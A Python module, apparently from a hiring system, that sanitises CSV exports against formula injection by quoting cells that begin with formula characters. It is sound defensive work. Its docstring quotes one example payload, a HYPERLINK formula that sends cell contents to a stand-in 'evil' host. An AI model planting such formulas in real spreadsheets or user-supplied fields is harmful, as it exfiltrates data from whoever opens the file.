"""CSV 导出安全：公式注入（CSV Injection / Formula Injection）防护.

背景 (2026-10-08 审查 F-17):
    `csv.writer` 只做分隔符/引号转义, **不会**阻止 Excel / WPS / LibreOffice 把
    以 `=` `+` `-` `@` TAB CR 开头的单元格当公式执行。候选人姓名、公司、职位、
    拒绝原因等都是用户可控内容 —— 攻击者在简历里填

        =HYPERLINK("http://evil/?d="&A1,"点击查看")

    HR 打开导出文件即可触发外链 / 数据外带, 旧版 Excel 甚至可形成命令执行链。

用法:
    from apps.common.csv_safe import SafeCsvWriter, SafeCsvDictWriter, csv_safe

    w = SafeCsvWriter(buf)
    w.writerow([...])          # 自动对每个单元格做净化

不要再用裸 `csv.writer` / `csv.DictWriter` 写用户可控数据。
"""
from __future__ import annotations

import csv
from typing import Any, Iterable, Mapping

# Excel / WPS / LibreOffice 会当作公式前缀的字符
_FORMULA_PREFIXES = ('=', '+', '-', '@', '\t', '\r')


def csv_safe(value: Any) -> Any:
    """把可能被当成公式的单元格前置一个单引号。

    非字符串原样返回 (数字/None/布尔不需要处理, 也不会被当作公式)。
    """
    if not isinstance(value, str):
        return value
    if value[:1] in _FORMULA_PREFIXES:
        return "'" + value
    return value


def csv_safe_row(row: Iterable[Any]) -> list:
    return [csv_safe(v) for v in row]


class SafeCsvWriter:
    """csv.writer 的净化包装：writerow / writerows 自动逐单元格处理。"""

    def __init__(self, f, **kwargs):
        self._writer = csv.writer(f, **kwargs)

    def writerow(self, row: Iterable[Any]) -> Any:
        return self._writer.writerow(csv_safe_row(row))

    def writerows(self, rows: Iterable[Iterable[Any]]) -> None:
        for row in rows:
            self.writerow(row)

    def __getattr__(self, name):
        return getattr(self._writer, name)


class SafeCsvDictWriter:
    """csv.DictWriter 的净化包装。"""

    def __init__(self, f, fieldnames, **kwargs):
        self._writer = csv.DictWriter(f, fieldnames, **kwargs)

    def writeheader(self) -> Any:
        return self._writer.writeheader()

    def writerow(self, row: Mapping[str, Any]) -> Any:
        return self._writer.writerow({k: csv_safe(v) for k, v in row.items()})

    def writerows(self, rows: Iterable[Mapping[str, Any]]) -> None:
        for row in rows:
            self.writerow(row)

    def __getattr__(self, name):
        return getattr(self._writer, name)
